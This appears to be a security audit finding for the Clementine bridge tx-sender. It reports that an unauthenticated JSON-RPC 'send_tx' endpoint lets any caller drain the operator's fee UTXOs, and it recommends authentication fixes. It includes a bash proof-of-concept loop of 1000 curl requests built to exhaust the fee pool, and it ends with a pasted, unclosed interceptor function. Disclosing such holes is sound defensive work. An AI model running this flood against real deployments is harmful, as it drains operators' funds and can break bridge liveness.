### Title
Unauthenticated tx-sender JSON-RPC `send_tx` Endpoint Allows Any Caller to Drain Fee UTXOs and Disrupt Bridge Liveness — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

---

### Summary

The tx-sender JSON-RPC server exposes a `send_tx` method with **zero authentication**. Any caller that can reach the port can submit arbitrary transactions with attacker-controlled `fee_paying_type = CPFP`, causing the tx-sender to create CPFP child transactions that spend its own fee UTXOs. Repeated calls drain the operator's fee balance, starving legitimate bridge transactions (kickoff, challenge, reimbursement) of fee-bumping capacity and breaking bridge liveness with material fund impact.

---

### Finding Description

`start_jsonrpc_server` in `crates/clementine-tx-sender/src/jsonrpc/server.rs` builds a plain HTTP JSON-RPC server using `jsonrpsee::server::ServerBuilder::default()` with no authentication layer:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    ...
``` [1](#0-0) 

The `send_tx` handler passes the caller-supplied `fee_paying_type` directly into `insert_try_to_send` without any identity check:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    ...
    let try_to_send_id = client
        .insert_try_to_send(
            &mut dbtx,
            req.tx_metadata,
            &signed_tx,
            req.fee_paying_type,   // ← attacker-controlled
            req.rbf_signing_info,
            ...
        )
        .await
        ...
``` [2](#0-1) 

The configuration explicitly permits binding to `0.0.0.0`, making the server reachable from any network interface:

```rust
if bind != "127.0.0.1" && bind != "0.0.0.0" {
    return Err(BridgeError::EnvVarMalformed(...));
}
``` [3](#0-2) 

When `fee_paying_type` is `CPFP`, the tx-sender loop creates a child transaction that spends the tx-sender's own fee UTXOs to pay fees for the submitted transaction: [4](#0-3) 

The gRPC actor endpoints (verifier, operator) are protected by the `OnlyAggregatorAndSelf` mTLS interceptor: [5](#0-4) 

The JSON-RPC tx-sender endpoint has **no equivalent protection**.

---

### Impact Explanation

**Direct — theft of tx-sender-managed balances**: Each attacker-submitted CPFP transaction causes the tx-sender to create a child transaction spending one or more of its own fee UTXOs. Flooding the queue with many such requests drains the entire fee UTXO pool.

**Indirect — bridge liveness failure with fund impact**: The tx-sender is responsible for broadcasting time-sensitive bridge transactions:
- `TransactionType::Challenge` — must be broadcast within the challenge window to slash a malicious operator
- `TransactionType::Kickoff`, `TransactionType::Reimburse`, `TransactionType::DisproveTimeout` — must land on-chain within protocol timeouts [6](#0-5) 

If the fee UTXO pool is exhausted, the tx-sender cannot create CPFP children for any of these transactions. A malicious operator can exploit this window to go unchallenged, resulting in theft of bridged BTC or loss of operator collateral.

---

### Likelihood Explanation

- **When `TX_SENDER_JSONRPC_BIND=0.0.0.0`**: Any network-reachable attacker can exploit this with a single `curl` command. The run.sh deployment script explicitly documents this as a valid configuration.
- **When `TX_SENDER_JSONRPC_BIND=127.0.0.1` (default)**: Any process on the same host (e.g., a compromised co-located service, a container sharing the host network namespace) can exploit this.
- The `json-rpc` feature is compiled in for the standalone tx-sender deployment (`cargo run -p clementine-tx-sender --features json-rpc`). [7](#0-6) 

---

### Recommendation

Add authentication to the JSON-RPC server before it is reachable in any deployment. Concrete options:

1. **Shared secret / Bearer token**: Require a configurable API key in the `Authorization` header; reject requests that do not present it.
2. **Unix domain socket**: Replace TCP binding with a Unix socket; access control is then enforced by filesystem permissions.
3. **IP allowlist**: Validate the connecting IP against a configurable allowlist inside the handler.
4. **mTLS**: Mirror the pattern used by the gRPC actor servers (`OnlyAggregatorAndSelf` interceptor) and require a client certificate signed by the operator's CA.

### Proof of Concept

```bash
# Attacker floods the tx-sender queue with CPFP transactions,
# draining the operator's fee UTXOs.
# Replace <HOST>:<PORT> with the tx-sender JSON-RPC address.
# Replace <VALID_TX_HEX> with any syntactically valid Bitcoin transaction hex.

for i in $(seq 1 1000); do
  curl -s -X POST http://<HOST>:<PORT> \
    -H 'Content-Type: application/json' \
    -d "{
      \"jsonrpc\": \"2.0\",
      \"id\": $i,
      \"method\": \"send_tx\",
      \"params\": [{
        \"signed_tx_hex\": \"<VALID_TX_HEX>\",
        \"fee_paying_type\": \"CPFP\",
        \"rbf_signing_info\": null,
        \"cancel_outpoints\": [],
        \"cancel_txids\": [],
        \"activate_txids\": [],
        \"activate_outpoints\": [],
        \"tx_metadata\": null
      }]
    }"
done
# After 1000 iterations the tx-sender's fee UTXO pool is exhausted.
# Legitimate challenge/kickoff/reimbursement transactions can no longer
# be fee-bumped, breaking bridge liveness.
```

fn only_aggregator_and_self(
    req: Request<()>,
    our_cert: &CertificateDer<'static>,
    aggregator_cert: &CertificateDer<'static>,
) -> Result<Request<()>, Status> {
    let Some(peer_certs) = req.peer_certs() else {
        if cfg!(test) {
            // Test mode, we don't need to verify peer certificates
            return Ok(req);
        } else {
            // If we're not in test mode, we need to check peer certificates
            return Err(Status::unauthenticated(
                "Failed to verify peer certificate, is TLS enabled?",
            ));
        }
    };

    // IMPORTANT: Only check the leaf (end-entity) certificate, which is always the first
    // certificate in the chain. The leaf is the only certificate whose private key the peer
    // proved possession of during the TLS handshake. Checking anywhere else in the chain
    // would allow identity spoofing: an attacker could include a pinned cert as an
    // intermediate in their chain without possessing its private key.
    let Some(leaf_cert) = peer_certs.first() else {
        return Err(Status::unauthenticated("Peer certificate chain is empty"));
    };

    if is_internal(&req) {
        if leaf_cert == our_cert {
            Ok(req)
        } else {
            Err(Status::unauthenticated(
                "Unauthorized call to internal method (not self)",
            ))
        }
    } else if leaf_cert == aggregator_cert || leaf_cert == our_cert {
        Ok(req)
    } else {
        Err(Status::unauthenticated(
            "Unauthorized call to method (not aggregator or self)",
        ))
    }
